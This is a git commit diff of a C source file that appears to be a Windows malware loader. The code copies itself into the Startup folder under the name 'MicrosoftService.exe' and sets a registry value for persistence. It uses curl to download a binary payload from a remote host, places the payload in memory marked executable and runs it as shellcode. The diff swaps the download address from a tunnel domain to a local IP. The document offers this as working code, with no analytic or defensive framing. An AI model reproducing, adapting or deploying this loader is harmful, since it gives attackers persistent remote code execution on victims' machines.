982fdcb68ff7e561ef2ecc75b96500823b52a3ed
L0pa <haxl0p4@proton.me>
2024-10-24 23:46:17 +0200

    Update main.c

--- main.c
+++ main.c
@@ -2,10 +2,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <windows.h>
-#include <winsock2.h>
-#include <windows.h>
-#include <winuser.h>
-#include <wininet.h>
+#include <shlobj.h>  
 
 void copyToStartup(char *sourcePath, char *destinationPath) {
     CopyFile(sourcePath, destinationPath, FALSE);
@@ -20,8 +17,14 @@ int bootRun() {
         return -1;
     }
 
-    // Percorso di destinazione per copiare l'eseguibile
-    char destination[MAX_PATH] = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\MicrosoftService.exe";
+    char startupPath[MAX_PATH];
+    if (!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
+        return -1;
+    }
+
+    char destination[MAX_PATH];
+    snprintf(destination, MAX_PATH, "%s\\MicrosoftService.exe", startupPath);
+
     copyToStartup(szPath, destination);
 
     HKEY NewVal;
@@ -34,6 +37,7 @@ int bootRun() {
         RegCloseKey(NewVal);
         return -1;
     }
+
     RegCloseKey(NewVal);
     return 0;
 }
@@ -49,7 +53,7 @@ int main() {
     void *(*f5)(void *, const void *, size_t) = memcpy;
 
     FILE *fpipe;
-    char *command = "curl https://loki.serveo.net/code.bin";
+    char *command = "curl http://192.168.1.57:8090/code.bin";
     char c = 0;
     unsigned char code[460];
     int counter = 0;
@@ -61,13 +65,16 @@ int main() {
 
     while (f2(&c, sizeof c, 1, fpipe)) {
         code[counter] = c;
-        counter = counter + 1;
+        counter++;
     }
 
     f3(fpipe);
 
     void *exec = f4(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     f5(exec, code, sizeof code);
+
     ((void(*)())exec)();
+
     return 0;
 }
+
